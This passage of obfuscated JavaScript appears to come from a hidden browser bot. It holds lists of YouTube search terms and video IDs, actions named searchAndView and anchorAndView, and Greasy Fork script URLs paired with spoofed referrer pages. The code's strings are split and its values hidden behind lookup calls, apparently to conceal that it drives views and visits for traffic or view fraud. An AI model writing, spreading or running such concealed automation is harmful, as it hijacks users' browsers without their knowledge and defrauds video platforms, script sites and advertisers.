't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0xf9e + 0x1 * 0x1de5 + -0x2d79)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x2256 + -0xd * 0xd5 + 0x1 * -0x177b)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x594 * -0x2 + 0x25ea + -0x310f);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    Y(0xa) + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    Z(0x8) + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    Y(0x11) + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    Y(0xd) + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    Y(0x0) + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': Y(0x3) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': Y(0x3) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
